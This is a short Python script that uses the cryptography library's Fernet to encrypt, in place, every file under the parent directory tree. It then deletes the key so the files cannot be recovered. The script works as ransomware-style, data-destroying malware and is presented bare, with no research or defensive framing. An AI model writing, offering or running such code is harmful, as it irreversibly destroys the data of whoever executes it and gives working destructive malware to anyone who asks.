from cryptography.fernet import Fernet
import os

# Function to encrypt a file
def encrypt_file(file_path, key):
    if os.path.isfile(file_path):
        with open(file_path, "rb") as rfile:
            file_data = rfile.read()
            encrypted_data = key.encrypt(file_data)
        with open(file_path, "wb") as wfile:
            wfile.write(encrypted_data)
        print(f"File '{file_path}' encrypted successfully.")
    else:
        print(f"File '{file_path}' not found.")

# Generate a Fernet key
key = Fernet.generate_key()
f = Fernet(key)

# List all files in the current directory, its subdirectories, and parent directories
for root, dirs, files in os.walk(".."):
    for file in files:
        file_path = os.path.join(root, file)
        encrypt_file(file_path, f)

# Securely delete the key from memory
del key

